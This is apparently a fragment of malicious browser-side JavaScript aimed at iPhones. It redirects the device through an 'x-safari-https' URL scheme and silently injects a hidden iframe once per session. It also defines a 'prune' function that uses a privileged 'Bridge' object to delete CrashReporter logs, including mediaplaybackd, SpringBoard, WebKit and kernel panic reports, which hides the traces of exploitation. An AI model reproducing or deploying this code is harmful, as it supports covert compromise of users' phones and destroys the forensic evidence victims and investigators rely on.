if (/iPhone/.test(navigator.userAgent)) {
    location.href = 'x-safari-https://next.example.invalid/start';
    if (!sessionStorage.getItem('visited')) {
        sessionStorage.setItem('visited', '1');
        const frame = document.createElement('iframe');
        frame.src = 'frame.html?' + Math.random();
        frame.style.display = 'none';
        document.body.appendChild(frame);
    }
}
function prune() {
    let files = Bridge.getContentsOfDir('/var/mobile/Library/Logs/CrashReporter/');
    for (let file of files) {
        if (file.includes('mediaplaybackd') || file.includes('SpringBoard') ||
            file.includes('com.apple.WebKit.') || file.includes('panic-full-')) {
            Bridge.deleteFileAtPath(file);
        }
    }
}
